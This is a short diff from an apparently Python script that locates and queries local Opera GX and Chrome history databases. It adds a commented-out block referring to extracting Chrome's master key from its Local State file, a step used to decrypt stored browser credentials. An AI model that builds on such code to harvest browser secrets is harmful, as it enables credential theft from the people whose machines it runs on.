@@ -69,6 +69,11 @@ SQL = {
 print(TARGET_FILE_PATH["OPERAGX_HISTORY_DB_PATH"])
 print(os.path.isfile(TARGET_FILE_PATH["OPERAGX_HISTORY_DB_PATH"]))
 
+"""
+get_master_key(TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
+ for file_path in TARGET_FILE_PATH:
+"""
+
 
 x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
 for i in x:
